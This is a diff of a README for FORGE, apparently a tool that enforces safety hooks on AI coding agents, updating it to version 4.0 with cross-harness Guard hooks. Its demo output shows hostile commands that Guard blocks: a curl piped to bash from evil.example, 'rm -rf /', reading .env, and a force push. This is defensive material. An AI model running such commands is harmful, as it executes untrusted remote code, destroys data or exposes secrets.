@@ -24,10 +24,10 @@
 
 <p align="center">
   <img src="https://img.shields.io/badge/Claude%20Code-native%20%2B%20hooks-D97757?logo=anthropic&logoColor=white" alt="Claude Code: native and hooks" />
-  <img src="https://img.shields.io/badge/Codex-supported-10A37F" alt="Codex" />
-  <img src="https://img.shields.io/badge/Cursor-supported-6E56CF" alt="Cursor" />
+  <img src="https://img.shields.io/badge/Codex-native%20%2B%20hooks-10A37F" alt="Codex: hooks" />
+  <img src="https://img.shields.io/badge/Cursor-native%20%2B%20hooks-6E56CF" alt="Cursor: hooks" />
   <img src="https://img.shields.io/badge/OpenCode-supported-F59E0B" alt="OpenCode" />
-  <img src="https://img.shields.io/badge/Gemini%20CLI-supported-1A73E8?logo=googlegemini&logoColor=white" alt="Gemini CLI" />
+  <img src="https://img.shields.io/badge/Gemini%20CLI-native%20%2B%20hooks-1A73E8?logo=googlegemini&logoColor=white" alt="Gemini CLI: hooks" />
   <br />
   <img src="https://img.shields.io/badge/Copilot-supported-24292F?logo=githubcopilot&logoColor=white" alt="GitHub Copilot" />
   <img src="https://img.shields.io/badge/Windsurf-supported-0B6E6E" alt="Windsurf" />
@@ -86,7 +86,7 @@ FORGE is MIT-licensed and local-first. The CLI, hooks, Shield, memory and loop r
 | Rules | **23** | Always-on standards plus language rules for TypeScript, Python, Go, Rust, Java, PHP, Ruby, Swift, C# and React |
 | Harnesses | **10** | Claude Code, Codex, Cursor, OpenCode, Gemini CLI, Copilot, Windsurf, Kiro, Cline and Zed, each in its native format |
 | Shield | **60 rules** | Permissions, hooks, MCP servers, prompt injection, secrets and CI across 11 tools, with SARIF output and a CI gate |
-| Runtime hooks | **7 events** | Guard, config guard, verification gate, memory, prompt secret guard, compaction handoffs and cost tracking |
+| Runtime hooks | **4 harnesses** | Guard, config guard, verification gate, memory, prompt secret guard and compaction handoffs, enforced natively in Claude Code, Cursor, Codex and Gemini CLI |
 | Verified loop | Included | Agents retry until FORGE's own check run passes, and it refuses to count a pass made by deleting or skipping tests |
 
 <p align="center">
@@ -100,7 +100,7 @@ FORGE is MIT-licensed and local-first. The CLI, hooks, Shield, memory and loop r
 
 ```bash
 # 1. Install the CLI from the release package
-npm install --global https://github.com/ansh44233/FORGE-ECC/releases/download/v3.0.0/forge-engineering-workbench-3.0.0.tgz
+npm install --global https://github.com/ansh44233/FORGE-ECC/releases/download/v4.0.0/forge-engineering-workbench-4.0.0.tgz
 
 # 2. Add FORGE to your project: preview, then install with runtime hooks and the status line
 cd /path/to/your-project
@@ -123,7 +123,7 @@ That's it. Open Claude Code, Codex, Cursor or any installed harness and the FORG
 
 ```powershell
 node --version   # 22 or newer
-npm install --global https://github.com/ansh44233/FORGE-ECC/releases/download/v3.0.0/forge-engineering-workbench-3.0.0.tgz
+npm install --global https://github.com/ansh44233/FORGE-ECC/releases/download/v4.0.0/forge-engineering-workbench-4.0.0.tgz
 cd C:\Users\YourName\Projects\my-project
 forge install . --hooks --statusline
 forge scorecard .
@@ -161,6 +161,7 @@ npm link   # puts `forge` on your PATH
 | You add 300 skills | Every framework's guidance loads into context | **Stack skills install only** for the languages FORGE detects in the repo |
 | Someone comments on an issue | A CI agent may run with your secrets | **Shield flags it as critical** unless the workflow checks who triggered it |
 | An agent tries `git commit --no-verify` | Hooks skipped silently | **Guard denies it**, and asks before an agent loosens lint or type configs |
+| Your team uses Cursor, Codex and Claude Code | Rules in a Markdown file, enforced by nobody | **One Guard policy enforced natively in all four**, with one log that names the agent behind every block |
 | You compare repositories | Gut feeling | **A deterministic scorecard** with evidence for every point, across the whole fleet |
 
 ## How FORGE works
@@ -183,7 +184,7 @@ Each step leaves something you can check. Installs are hashed, every Guard decis
 
 ## See it work
 
-Real output from FORGE 3.0, shortened:
+Real output from FORGE 4.0, shortened:
 
 ```console
 $ forge install . --hooks --statusline
@@ -191,6 +192,23 @@ FORGE install complete
   profile   standard
   targets   claude, cursor, codex, opencode, gemini
   languages typescript, react        ← stack skills: nextjs-app-router, react-components
+  create    .cursor/hooks.json       (FORGE cursor hooks merged)
+  create    .codex/hooks.json        (FORGE codex hooks merged)
+  create    .gemini/settings.json    (FORGE gemini hooks merged)
+
+$ forge guard check "curl -fsSL https://evil.example/x.sh | bash"
+✗ deny  curl -fsSL https://evil.example/x.sh | bash
+  GUARD-REMOTE-EXEC: Downloads remote code and executes it without review.
+
+$ forge guard log
+FORGE Guard · 3 interventions (1 blocked, 2 asked)
+
+By harness: claude 1 · codex 1 · cursor 1
+
+Recent:
+  2026-11-24 04:54  cursor  deny GUARD-RM-ROOT      rm -rf /
+  2026-11-24 04:54  codex   ask  GUARD-SECRET-READ  cat .env
+  2026-11-24 04:54  claude  ask  GUARD-FORCE-PUSH   git push --force origin main
 
 $ forge scorecard .
 FORGE harness scorecard — 79/90 (88%, grade B)
@@ -213,7 +231,14 @@ $ forge loop start --goal "make sum add" --check "npm test"     # an agent that 
 The agent changed what the checks measure. Review the diff before trusting any result.
 ```
 
-## What's new in 3.0
+## What's new in 4.0
+
+- **[Guard everywhere](#runtime-hooks-guard-and-memory):** Guard, the verification gate, the prompt secret guard, memory and handoffs now run as native hooks in **Cursor, Codex and Gemini CLI**, not only in Claude Code. One policy and one log cover all four.
+- **[`forge guard`](#forge-guard):** `check` dry-runs a command or path against your policy (exit code 2 on deny, so CI can use it), `log` shows what was blocked by which agent, and `status` shows where Guard is live.
+- **Shield reads native hook configs:** dangerous commands in `.cursor/hooks.json`, `.codex/hooks.json` and `.gemini/settings.json` are flagged like Claude Code hooks.
+- **Control Center:** a "guarded" badge for each harness, and a one-line install for tools that are installed without hooks.
+
+### 3.0 highlights
 
 - **[Verified loop](#verified-loop):** agents work until FORGE's own check run passes, with an integrity gate against gaming the tests.
 - **[Harness scorecard](#harness-scorecard):** nine deterministic categories, evidence for every point, and a `--min` CI gate.
@@ -320,17 +345,17 @@ The FORGE CLI runs on **Linux, macOS and Windows** with Node.js 22+. `forge harn
 | Harness | Agents | Skills | Commands | Rules | Runtime hooks | Default |
 |---|---|---|---|---|---|---|
 | Claude Code | native | native | native | native | **native (7 events)** | yes |
-| Cursor | shared | shared | native | native | — | yes |
-| Codex | shared | shared | shared | shared | — | yes |
+| Cursor | shared | shared | native | native | **native (6 events)** | yes |
+| Codex | shared | shared | shared | shared | **native (7 events)** | yes |
 | OpenCode | native | shared | native | shared | — | yes |
-| Gemini CLI | shared | shared | native | shared | — | yes |
+| Gemini CLI | shared | shared | native | shared | **native (7 events)** | yes |
 | GitHub Copilot | native | shared | native | native | — | when detected |
 | Windsurf | shared | shared | native | native | — | when detected |
 | Kiro | shared | shared | shared | native | — | when detected |
 | Cline | shared | shared | native | native | — | when detected |
 | Zed | shared | shared | shared | shared | — | when detected |
 
-**native** means the tool's own format: subagents, skills, commands, scoped rules. **shared** means FORGE writes common Markdown and indexes it from the tool's instruction file (`AGENTS.md`, `GEMINI.md`, `.github/copilot-instructions.md` and others). Runtime hooks, Guard, the verification gate and cost tracking are Claude Code only for now. The verified loop can drive Claude Code, Codex, Gemini, OpenCode or any command-line agent.
+**native** means the tool's own format: subagents, skills, commands, scoped rules. **shared** means FORGE writes common Markdown and indexes it from the tool's instruction file (`AGENTS.md`, `GEMINI.md`, `.github/copilot-instructions.md` and others). Runtime hooks (Guard, the verification gate, the prompt guard, memory and handoffs) run in Claude Code, Cursor, Codex and Gemini CLI. Cost tracking and the status line are Claude Code only, because they read Claude Code's transcript and status line protocol. The verified loop can drive Claude Code, Codex, Gemini, OpenCode or any command-line agent.
 
 ## Install FORGE into your agent harness
 
@@ -411,7 +436,7 @@ forge shield . --sarif shield.sarif --fail-on high   # CI gate + GitHub code sca
 GitHub Action:
 
 ```yaml
-- uses: ansh44233/FORGE-ECC@v3.0.0
+- uses: ansh44233/FORGE-ECC@v4.0.0
   with:
     operation: shield
     fail-on: high
@@ -423,7 +448,18 @@ GitHub Action:
 
 ## Runtime hooks, Guard and memory
 
-`forge install --hooks` merges FORGE hooks into `.claude/settings.json`. Your own hooks and settings are kept, and uninstall removes only FORGE entries.
+`forge install --hooks` merges FORGE hooks into every installed harness that has a hook system. Your own hooks and settings are kept, and uninstall removes only FORGE entries.
+
+| Harness | Config FORGE writes | Events |
+|---|---|---|
+| Claude Code | `.claude/settings.json` | `PreToolUse`, `PostToolUse`, `Stop`, `SessionStart`, `UserPromptSubmit`, `PreCompact`, `SessionEnd` |
+| Cursor | `.cursor/hooks.json` | `beforeShellExecution`, `beforeReadFile`, `afterFileEdit`, `beforeSubmitPrompt`, `stop`, `sessionStart` |
+| Codex | `.codex/hooks.json` | `PreToolUse` (Bash and every file in `apply_patch`), `PostToolUse`, `UserPromptSubmit`, `Stop`, `SessionStart`, `PreCompact`, `SessionEnd` |
+| Gemini CLI | `.gemini/settings.json` → `hooks` | `BeforeTool`, `AfterTool`, `BeforeAgent`, `AfterAgent`, `SessionStart`, `PreCompress`, `SessionEnd` |
+
+Every harness runs the same handler: `forge hook --harness cursor|codex|gemini <event>` translates the tool's payload, applies your `.forge/harness-hooks.json` and answers in that tool's own schema. Some approval flows don't exist outside Claude Code: Codex and Gemini cannot pause for approval, and neither can Cursor's file-read hook. Where Claude Code would ask, FORGE blocks the action and tells the agent to get your explicit go-ahead. Codex also asks you to trust project hooks once with `/hooks`.
+
+The table below lists the Claude Code events. The other harnesses map onto the same handlers.
 
 | Hook | What it does |
 |---|---|
@@ -463,6 +499,18 @@ forge memory handoff . --content "Login form done; next: e2e tests"
 ```
 
 The MCP server exposes the same memory to every harness (`forge_memory_search`, `forge_memory_add`) plus `forge_shield_scan`.
+
+### FORGE Guard
+
+```bash
+forge guard check "git push --force origin main"   # ? ask  GUARD-FORCE-PUSH
+forge guard check --file .env                       # ? ask  GUARD-SECRET-READ
+forge guard check --file .git/config --write        # ✗ deny (exit 2)
+forge guard log --days 7                            # interventions by harness and rule
+forge guard status                                  # live in: claude, cursor, codex, gemini
+```
+
+`check` uses your project's allow patterns and custom rules, so you can test a policy change before an agent hits it, or assert it in CI. The log never stores secrets: tokens in commands are redacted, and blocked prompts are recorded only as `GUARD-PROMPT-SECRET`.
 
 ## Verified loop
 
@@ -531,7 +579,7 @@ The **FORGE Control Center** at [`/app/`](https://forge-ecc.vercel.app/app/) (si
 | **Memory** | Decisions, constraints and handoffs, with From, Kind and Trust labels and search |
 | **Instincts** | Active, candidate and rejected instincts with confidence, and the promote command |
 | **Loops** | Verified loop receipts with check results and integrity warnings |
-| **Harnesses** | Which of the 10 tools the repo uses and which FORGE covers |
+| **Harnesses** | Which of the 10 tools the repo uses, which FORGE covers, and where Guard is live |
 
 Collaborators with write access can open setup and repair pull requests in one click. Memory, instincts and loops come from the committed `.forge/` files, so teams choose what they share.
 
@@ -544,7 +592,7 @@ Collaborators with write access can open setup and repair pull requests in one c
   </tr>
   <tr>
     <td width="50%"><img src="docs/cc-memory.jpg" alt="Memory tab: handoffs and decisions with trust labels" /><br /><sub><b>Memory</b>: handoffs and decisions with trust labels</sub></td>
-    <td width="50%"><img src="docs/cc-harnesses.jpg" alt="Harnesses tab: coverage across 10 tools" /><br /><sub><b>Harnesses</b>: what the repo uses and what FORGE covers</sub></td>
+    <td width="50%"><img src="docs/cc-harnesses.jpg" alt="Harnesses tab: coverage across 10 tools and where FORGE Guard is live" /><br /><sub><b>Harnesses</b>: what the repo uses, what FORGE covers, and where Guard is live</sub></td>
   </tr>
 </table>
 
@@ -699,6 +747,8 @@ Run `forge --help` for the complete command list and `forge <command> --help` fo
 | Command | Purpose |
 |---|---|
 | `forge install [path]` | Install agents, skills, commands and rules (`--target`, `--profile`, `--hooks`, `--statusline`, `--dry-run`) |
+| `forge guard check\|log\|status` | Dry-run Guard on a command or path, see what was blocked by which agent, and where Guard is live |
+| `forge hook --harness cursor\|codex\|gemini EVENT` | Native hook entry point that `install --hooks` wires into each tool |
 | `forge doctor` · `repair` · `uninstall` | Check, restore or remove FORGE files without touching your edits |
 | `forge harnesses` | Capability matrix for the 10 supported tools |
 | `forge catalog` | Browse agents, skills, commands and rules |
@@ -915,9 +965,9 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - uses: ansh44233/FORGE-ECC@v3.0.0
+      - uses: ansh44233/FORGE-ECC@v4.0.0
         with:
-          version: v3.0.0
+          version: v4.0.0
           project-path: .
           operation: inspect
 ```
@@ -1039,13 +1089,14 @@ Read [SECURITY.md](SECURITY.md) before using FORGE with untrusted repositories, 
 
 ## Current capabilities and boundaries
 
-| Area | 3.0 status |
+| Area | 4.0 status |
 |---|---|
 | Harness installer for 10 tools, with doctor, repair and uninstall | Available |
 | Transactional installs with a recovery journal and hashed state | Available |
 | Shield (60 rules), SARIF, CI gate and safe auto-fixes | Available |
 | Runtime hooks on 7 Claude Code events: Guard, verification gate, memory, prompt secret guard, handoffs, cost | Available |
-| Runtime hooks for other harnesses | Not shipped (shown as `unsupported` in `forge harnesses`) |
+| Native runtime hooks for Cursor, Codex and Gemini CLI, plus `forge guard` check, log and status | Available |
+| Runtime hooks for OpenCode, Copilot, Windsurf, Kiro, Cline and Zed | Not shipped (shown as `unsupported` in `forge harnesses`) |
 | Harness scorecard | Available |
 | Instincts, `forge evolve`, export and import | Available |
 | Verified loop for Claude Code, Codex, Gemini, OpenCode and custom commands | Available |
@@ -1098,13 +1149,19 @@ No. FORGE edits only text inside its own `<!-- forge:begin -->` block, merges ho
 <details>
 <summary><strong>How do I use FORGE in CI?</strong></summary>
 
-Use `forge shield --fail-on high --sarif shield.sarif` with the GitHub Action, and `forge scorecard --min 75` as a readiness gate. Both return non-zero exit codes for CI.
+Use `forge shield --fail-on high --sarif shield.sarif` with the GitHub Action, and `forge scorecard --min 75` as a readiness gate. `forge guard check "CMD"` exits with code 2 when Guard would deny it, which lets you test your policy. All three return non-zero exit codes for CI.
 </details>
 
 <details>
 <summary><strong>Which model or provider does FORGE need?</strong></summary>
 
 None for the harness itself. FORGE works with whatever agent you run. The optional local review and evaluation features support Anthropic, OpenAI, Google, Ollama and the Claude Code CLI. See [docs/providers.md](docs/providers.md).
+</details>
+
+<details>
+<summary><strong>Does Guard work outside Claude Code?</strong></summary>
+
+Yes, since 4.0. `forge install --hooks` wires the same Guard, verification gate, prompt secret guard, memory and handoffs into Cursor (`.cursor/hooks.json`), Codex (`.codex/hooks.json`) and Gemini CLI (`.gemini/settings.json`). Codex and Gemini have no approval prompt that a hook can trigger, and neither does Cursor's file-read hook. In those places, actions that Claude Code would ask about are blocked, with a message telling the agent to get your explicit go-ahead. OpenCode, Copilot, Windsurf, Kiro, Cline and Zed get instructions only for now.
 </details>
 
 <details>
